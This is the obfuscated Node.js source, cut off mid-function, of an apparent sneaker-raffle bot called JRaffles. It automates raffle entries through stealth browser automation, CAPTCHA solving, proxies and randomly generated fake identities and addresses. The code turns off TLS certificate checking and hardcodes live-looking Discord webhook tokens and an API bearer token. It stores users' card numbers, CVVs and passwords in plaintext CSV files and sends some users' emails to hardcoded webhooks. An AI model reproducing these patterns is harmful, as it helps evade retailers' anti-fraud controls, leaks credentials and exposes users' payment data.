process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0xaf9669 = require('fs'), _0x24f2fc = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x3b3217(_0x24e56d) {
    const _0x5cfb2d = _0xaf9669['createWriteStream'](_0x24e56d, { 'flags': 'a' }), _0x3c607d = console['log'];
    console['log'] = function () {
        const _0x2cfdc8 = Array['prototype']['slice']['call'](arguments), _0x17d7e3 = _0x2cfdc8['join']('\x20') + '\x0a';
        _0x5cfb2d['write'](_0x17d7e3), _0x3c607d['apply'](console, _0x2cfdc8);
    };
}
_0x3b3217('../logs/log\x20' + _0x24f2fc);
var _0x92856 = require('tough-cookie'), _0x569e4e = require('node-imap'), _0x2e3894 = require('util')['inspect'];
const _0x2736cb = require('mailparser')['simpleParser'], { EmbedBuilder: _0x2df938 } = require('discord.js');
var _0x150d9a = require('exe');
const { execFile: _0x4f71a4 } = require('child_process'), _0x275ae5 = require('puppeteer-extra'), _0x160a3e = require('cross-spawn'), _0x5dbd94 = require('puppeteer-extra-plugin-recaptcha'), _0x149eeb = require('puppeteer-extra-plugin-stealth'), _0x5dc29b = require('chalk'), _0x424e52 = require('node-bash-title'), _0x328de3 = require('axios'), _0x6aec87 = require('papaparse');
var _0x15cfd6 = require('random-name');
const _0x417264 = require('request');
var _0x160288 = require('prompt');
const _0x15ef28 = _0x417264['jar']();
var _0x165c4b = {};
const _0x3443a3 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x3d6fd6 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x589db8 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0xe0b935 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x23c649 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x114390 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x4c8bd5 = 'https://discord.com/api/webhooks/', _0x500f59 = '' + _0x4c8bd5 + _0x589db8, _0xd282bc = '' + _0x4c8bd5 + _0xe0b935, _0xbd9f1e = '' + _0x4c8bd5 + _0x3443a3, _0x369064 = '' + _0x4c8bd5 + _0x3d6fd6, _0x3ba9f8 = '' + _0x4c8bd5 + _0x23c649, _0x4728a4 = '' + _0x4c8bd5 + _0x114390;
const _0xd223b3 = JSON['parse'](_0xaf9669['readFileSync']('country.json', 'utf-8')), _0x327410 = JSON['parse'](_0xaf9669['readFileSync']('../package.json', 'utf-8')), _0x57c4cf = _0x327410['version'];
var _0x5ce28a, _0x268393, _0x1179a0, _0x59aeb7, _0x7b8086, _0x2c6615, _0x5f9620, _0x5deae6;
const _0x22cf7d = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x45539d = ![];
const _0x1a4dfa = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x199dde = '0123456789';
var _0x1bab77 = _0x1a4dfa['split']('');
const _0x3f134e = require('auto-git-update'), _0x21fa67 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0xe99a43 = new _0x3f134e(_0x21fa67);
async function _0x23a9cd() {
    _0x7b8086 = _0xaf9669['readdirSync']('../proxies'), _0x59aeb7 = _0xaf9669['readdirSync']('../tasks'), !_0xaf9669['existsSync']('../accounts/fenom.csv') && _0xaf9669['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0xaf9669['existsSync']('../accounts/paypal.csv') && _0xaf9669['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0xaf9669['existsSync']('../accounts/bstn.csv') && _0xaf9669['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0xaf9669['existsSync']('../accounts/eql.csv') && _0xaf9669['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0xaf9669['existsSync']('../failed-tasks.csv') && _0xaf9669['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0xaf9669['existsSync']('../successful-tasks.csv') && _0xaf9669['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x165c4b = JSON['parse'](_0xaf9669['readFileSync']('../settings.json', 'utf-8')), !_0x165c4b['delay'] && (_0x165c4b['delay'] = 0x3c, _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['threads'] && (_0x165c4b['threads'] = 0x1, _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['python'] && (_0x160a3e('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20-r\x20modules/Confirmed/requirements.txt'
    ], { 'shell': !![] }), _0x160a3e('start', [
        'cmd',
        '/k',
        'py\x20-m\x20pip\x20install\x20git+https://github.com/66niko99/py-adyen-encrypt.git'
    ], { 'shell': !![] }), _0x165c4b['python'] = 'uptodate', _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['masterMail'] && (_0x165c4b['masterMail'] = 'yourmail@gmail.com', _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['CapSolver'] && (_0x165c4b['CapSolver'] = 'yourkeyhere', _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['masterPassword'] && (_0x165c4b['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['captchaKey'] && (_0x165c4b['captchaKey'] = '', _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['useRandomProxy'] && (_0x165c4b['useRandomProxy'] = !![], _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['shuffleTasks'] && (_0x165c4b['shuffleTasks'] = ![], _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), !_0x165c4b['webhook'] && (_0x165c4b['webhook'] = '', _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), _0x165c4b['delay'] <= 0x1388 && (_0x165c4b['delay'] = _0x165c4b['delay'] * 0x3e8), _0x165c4b['AfewDelay'] && (delete _0x165c4b['AfewDelay'], _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), _0x165c4b['MahaDelay'] && (delete _0x165c4b['MahaDelay'], _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), _0x165c4b['footshopDelay'] && (delete _0x165c4b['footshopDelay'], _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b, null, 0x2))), _0x165c4b['MahaDelay'] = _0x165c4b['delay'], _0x4c8bd5 = _0x165c4b['webhook'], _0x2c6615 = _0x165c4b['licenseKey'];
}
let _0x28bfe7, _0x5d7e9b = [], _0x206356;
const _0x415e3e = _0x2cc22c => new Promise(_0x4ac8d4 => setTimeout(_0x4ac8d4, _0x2cc22c));
function _0x79391d(_0x47e4a8, _0x19bbb5) {
    return Math['floor'](Math['random']() * (_0x19bbb5 - _0x47e4a8 + 0x1) + _0x47e4a8);
}
function _0xf2c680(_0x393a53) {
    let _0x204af3 = _0x393a53['length'], _0x331e90;
    while (_0x204af3 != 0x0) {
        _0x331e90 = Math['floor'](Math['random']() * _0x204af3), _0x204af3--, [_0x393a53[_0x204af3], _0x393a53[_0x331e90]] = [
            _0x393a53[_0x331e90],
            _0x393a53[_0x204af3]
        ];
    }
    return _0x393a53;
}
async function _0x4d957b(_0x1fb199) {
    try {
        return _0x328de3['post']('https://api.whop.com/api/v2/memberships/' + _0x1fb199 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0x524eb4) {
        console['log']('Error\x20checking\x20license:\x20' + _0x524eb4['message']);
    }
}
async function _0x317202(_0x5887c6) {
    console['clear']();
    if (_0x5887c6 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x479fb3 = await _0x160288['get']('License');
        if (_0x479fb3['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x415e3e(0xbb8), _0x317202(_0x5887c6);
        _0x5887c6 = _0x479fb3['License'], _0x165c4b['licenseKey'] = _0x5887c6, _0x2c6615 = _0x5887c6, _0xaf9669['writeFileSync']('../settings.json', JSON['stringify'](_0x165c4b));
    }
    console['log']('Checking\x20license\x20' + _0x2c6615 + '...'), await _0x415e3e(0x320);
    const _0xb7e18e = await _0x4d957b(_0x5887c6);
    _0x5f9620 = JSON['stringify'](_0xb7e18e['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x5deae6 = JSON['stringify'](_0xb7e18e['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0xb7e18e)
        return console['log']('License\x20not\x20found');
    if (!_0xb7e18e['data'])
        return console['log']('License\x20not\x20bound');
    return _0xb7e18e['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x45539d = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x45539d = ![]);
}
async function _0x1ed6f5() {
    var _0x1be6b7 = await _0x160288['get']('Module');
    return console['clear'](), _0x1be6b7['Module'];
}
;
async function _0x1b6014() {
    var _0x5d85a2 = await _0x160288['get']('Setting');
    return console['clear'](), _0x5d85a2['Setting'];
}
async function _0x5bcf7e(_0x1a1472) {
    var _0x393af0 = [];
    for (file of _0x59aeb7) {
        var _0x57408c = _0xaf9669['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x6aec87['parse'](_0x57408c, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x1a1472['store'] && _0x393af0['push'](file);
    }
    !_0x393af0['length'] == 0x0 && (_0x59aeb7 = _0x393af0);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x4ed51c = 0x0; _0x4ed51c < _0x59aeb7['length']; _0x4ed51c++) {
        console['log']('\x20(' + _0x4ed51c + ')\x20' + _0x59aeb7[_0x4ed51c]);
    }
    console['log']('');
    var _0x308533 = await _0x160288['get']('Task');
    if (_0x308533['Task'] > _0x59aeb7['length'] - 0x1 || isNaN(_0x308533['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x415e3e(0x3e8), _0x5bcf7e();
    var _0x52efb1 = _0xaf9669['readFileSync']('../tasks/' + _0x59aeb7[_0x308533['Task']], 'utf-8');
    return _0x1179a0 = _0x6aec87['parse'](_0x52efb1, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x5dc29b['blue'](_0x59aeb7[_0x308533['Task']])), _0x5ce28a = _0x59aeb7[_0x308533['Task']], _0x1179a0;
}
async function _0x405b3f() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0xad3e8d = 0x0; _0xad3e8d < _0x7b8086['length']; _0xad3e8d++) {
        console['log']('\x20(' + _0xad3e8d + ')\x20' + _0x7b8086[_0xad3e8d]);
    }
    console['log']('');
    var _0x303894 = await _0x160288['get']('Proxies');
    if (_0x303894['Proxies'] > _0x7b8086['length'] - 0x1 || isNaN(_0x303894['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x415e3e(0x3e8), _0x405b3f();
    var _0x265c6e = _0xaf9669['readFileSync']('../proxies/' + _0x7b8086[_0x303894['Proxies']], 'utf-8')['split']('\x0a');
    let _0x190509 = _0x265c6e['map']((_0x315df7, _0xb2019d) => {
        sanatizeProxy = _0x315df7['replace']('\x0d', '');
        if (_0x265c6e[_0xb2019d + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x268393 = _0x7b8086[_0x303894['Proxies']], console['clear'](), _0x190509;
}
async function _0xc980f7() {
    var _0x1dfaa2 = await _0x160288['get']('Value');
    return console['clear'](), _0x1dfaa2['Value'];
}
async function _0x179441(_0x167745) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0xed4a32 = 0x0; _0xed4a32 < _0x167745['length']; _0xed4a32++) {
        console['log']('\x20(' + _0xed4a32 + ')\x20[' + _0x167745[_0xed4a32]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x4c20a9 = await _0x160288['get']('Module');
    return _0x4c20a9['Module'];
}
async function _0x5564b0() {
    var _0x15b8a6 = await _0x160288['get']('Password');
    return console['clear'](), _0x15b8a6['Password'];
}
;
async function _0x2f2340() {
    var _0xc71d4e = await _0x160288['get']('Links');
    return _0xc71d4e['Links'];
}
;
async function _0x5576da() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x446295 = 0x0; _0x446295 < _0x5d7e9b['length']; _0x446295++) {
        console['log']('\x20(' + _0x446295 + ')\x20' + _0x5d7e9b[_0x446295]);
    }
    ;
    console['log']();
    let _0x38875c = await _0x160288['get']('Product');
    return console['clear'](), _0x38875c['Product'];
}
;
function _0x5b438b() {
    var _0x37b3f2 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x37b3f2;
}
;
function _0x1c87d7() {
    var _0x2e7f05 = new Date(Date['now']())['toLocaleString']();
    return _0x2e7f05['replace'](',', '');
}
async function _0x4d8e61(_0x14e223, _0x10055b) {
    let _0x5f46ab = { 'headers': { 'content-type': 'application/json' } };
    if (_0x57c4cf != 'devkey') {
        await _0x328de3['post'](_0x14e223, _0x10055b, _0x5f46ab);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x105954(_0x2f18a3, _0x2a7f6c, _0x27288f, _0x35d0f7, _0xa5014a) {
    if (!_0x35d0f7 && _0x27288f == 'dev') {
        var _0x4ca275 = new _0x2df938()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2a7f6c['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2a7f6c['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x2f18a3['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x165c4b['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x5f9620,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x2f18a3['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x2f18a3['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x57c4cf,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4ca275['data'];
    } else {
        if (_0x35d0f7 && _0x27288f == 'dev') {
            var _0x4ca275 = new _0x2df938()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2a7f6c['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x5f9620,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2a7f6c['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x2f18a3['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x165c4b['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0xa5014a,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x2f18a3['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x2f18a3['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x57c4cf,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4ca275['data'];
        } else {
            if (_0x27288f == 'pub') {
                var _0x4ca275 = new _0x2df938()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2a7f6c['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2a7f6c['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x2f18a3['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x165c4b['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x2f18a3['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x57c4cf,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4ca275['data'];
            } else {
                if (_0x27288f == 'acc' && !_0x35d0f7) {
                    var _0x4ca275 = new _0x2df938()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2a7f6c['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x5f9620,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2a7f6c['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x165c4b['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x57c4cf,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4ca275['data'];
                } else {
                    if (_0x27288f == 'acc' && _0x35d0f7) {
                        var _0x4ca275 = new _0x2df938()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2a7f6c['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x5f9620,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0xa5014a,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2a7f6c['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x165c4b['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x57c4cf,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4ca275['data'];
                    } else {
                        if (_0x27288f == 'open') {
                            var _0x4ca275 = new _0x2df938()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x5deae6)['addFields']({
                                'name': 'User',
                                'value': '' + _0x5f9620,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x57c4cf,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4ca275['data'];
                        } else {
                            if (!_0x35d0f7 && _0x27288f == 'ver') {
                                var _0x4ca275 = new _0x2df938()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2a7f6c['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x5f9620,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2a7f6c['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x165c4b['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x57c4cf,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4ca275['data'];
                            } else {
                                if (_0x35d0f7 && _0x27288f == 'ver') {
                                    var _0x4ca275 = new _0x2df938()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2a7f6c['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x5f9620,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0xa5014a,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2a7f6c['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x165c4b['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x57c4cf,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4ca275['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x3da21c(_0x1781f8, _0x1ea5a5) {
    var _0x1d13b1 = _0x1781f8[_0x1ea5a5]['Address1']['split'](''), _0x2062f5 = _0x1781f8[_0x1ea5a5]['Address2']['split'](''), _0xe4bafa = _0x1781f8[_0x1ea5a5]['Email']['split']('@');
    for (var _0x16672e = 0x0; _0x16672e < _0x1d13b1['length']; _0x16672e++) {
        if (_0x1d13b1[_0x16672e] == 'X') {
            var _0x622947 = Math['round'](Math['random']() * (_0x1a4dfa['length'] - 0x1));
            _0x1d13b1[_0x16672e] = _0x1bab77[_0x622947];
        }
    }
    ;
    for (var _0x16672e = 0x0; _0x16672e < _0x2062f5['length']; _0x16672e++) {
        if (_0x2062f5[_0x16672e] == 'X') {
            var _0x622947 = Math['round'](Math['random']() * (_0x1a4dfa['length'] - 0x1));
            _0x2062f5[_0x16672e] = _0x1bab77[_0x622947];
        }
    }
    ;
    _0x1781f8[_0x1ea5a5]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x1781f8[_0x1ea5a5]['FirstName'] = _0x15cfd6['first']());
    _0x1781f8[_0x1ea5a5]['LastName']['toUpperCase']() == 'RANDOM' && (_0x1781f8[_0x1ea5a5]['LastName'] = _0x15cfd6['last']());
    _0xe4bafa[0x0]['toUpperCase']() == 'RANDOM' ? _0xe4bafa[0x0] = '' + _0x15cfd6['first']() + _0x15cfd6['last']() + _0x79391d(0x1, 0x3e7) + '@' : _0xe4bafa[0x0] = _0xe4bafa[0x0] + '@';
    _0x1781f8[_0x1ea5a5]['Email'] = _0xe4bafa['join'](''), _0x1781f8[_0x1ea5a5]['Address1'] = _0x1d13b1['join'](''), _0x1781f8[_0x1ea5a5]['Address2'] = _0x2062f5['join']('');
    _0x1781f8[_0x1ea5a5]['Phone'] == 'RANDOM' && (_0x1781f8[_0x1ea5a5]['Phone'] = '0' + _0x79391d(0x5f5e100, 0x3b9ac9ff));
    if (_0x1781f8[_0x1ea5a5]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x5d1bde = _0x79391d(0x1, 0x270f);
        _0x1781f8[_0x1ea5a5]['Follower'] = '' + _0x15cfd6['first']() + _0x15cfd6['last']() + _0x5d1bde + '\x20';
    }
    _0x1781f8[_0x1ea5a5]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x1781f8[_0x1ea5a5]['HouseNumber'] = _0x79391d(0x1, 0xc8));
    if (_0x1781f8[_0x1ea5a5]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x1f2759 = Math['round'](Math['random']() * (_0x1a4dfa['length'] - 0x1)), _0x38326c = _0x1bab77[_0x1f2759];
        _0x1781f8[_0x1ea5a5]['Address1'] = _0x15cfd6['last']() + 'straat', _0x1781f8[_0x1ea5a5]['Zip'] == '' && (_0x1781f8[_0x1ea5a5]['Postcode'] = _0x79391d(0x3e8, 0x270f) + '\x20' + _0x38326c + _0x38326c, _0x1781f8[_0x1ea5a5]['Zip'] = _0x1781f8[_0x1ea5a5]['Postcode']), _0x1781f8[_0x1ea5a5]['HouseNumber'] = '' + _0x79391d(0x1, 0xc8);
    }
    return;
}
;
async function _0x4d12b6(_0x342313, _0x11e3fe) {
    _0xaf9669['appendFileSync']('../failed-tasks.csv', _0x1c87d7() + ',' + _0x11e3fe['store'] + ',' + _0x11e3fe['name'] + ',' + _0x342313['Url'] + ',' + _0x342313['Size'] + ',' + _0x342313['Follower'] + ',' + _0x342313['FirstName'] + ',' + _0x342313['LastName'] + ',' + _0x342313['Address1'] + ',' + _0x342313['Address2'] + ',' + _0x342313['HouseNumber'] + ',' + _0x342313['Zip'] + ',' + _0x342313['City'] + ',' + _0x342313['State'] + ',' + _0x342313['Country'] + ',' + _0x342313['Phone'] + ',' + _0x342313['Email'] + ',' + _0x342313['Password'] + ',' + _0x342313['PaymentMethod'] + ',' + _0x342313['CardType'] + ',' + _0x342313['NameOnCard'] + ',' + _0x342313['CardNumber'] + ',' + _0x342313['ExpiryDate'] + ',' + _0x342313['CVV'] + ',' + _0x342313['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x53db49(_0x8a67c6, _0x7356da) {
    _0xaf9669['appendFileSync']('../successful-tasks.csv', _0x1c87d7() + ',' + _0x7356da['store'] + ',' + _0x7356da['name'] + ',' + _0x8a67c6['Url'] + ',' + _0x8a67c6['Size'] + ',' + _0x8a67c6['Follower'] + ',' + _0x8a67c6['FirstName'] + ',' + _0x8a67c6['LastName'] + ',' + _0x8a67c6['Address1'] + ',' + _0x8a67c6['Address2'] + ',' + _0x8a67c6['HouseNumber'] + ',' + _0x8a67c6['Zip'] + ',' + _0x8a67c6['City'] + ',' + _0x8a67c6['State'] + ',' + _0x8a67c6['Country'] + ',' + _0x8a67c6['Phone'] + ',' + _0x8a67c6['Email'] + ',' + _0x8a67c6['Password'] + ',' + _0x8a67c6['PaymentMethod'] + ',' + _0x8a67c6['CardType'] + ',' + _0x8a67c6['NameOnCard'] + ',' + _0x8a67c6['CardNumber'] + ',' + _0x8a67c6['ExpiryDate'] + ',' + _0x8a67c6['CVV'] + ',' + _0x8a67c6['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x2905d5() {
    let _0x421cb1 = proxyFile['split']('\x0a'), _0x1454f4 = _0x421cb1['map']((_0x3752eb, _0x2bdca4) => {
        sanatizeProxy = _0x3752eb['replace']('\x0d', '');
        if (_0x421cb1[_0x2bdca4 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x1454f4;
}
;
async function _0x1daa70(_0x88f401, _0x34856d) {
    if (_0xf56519 != 'yes')
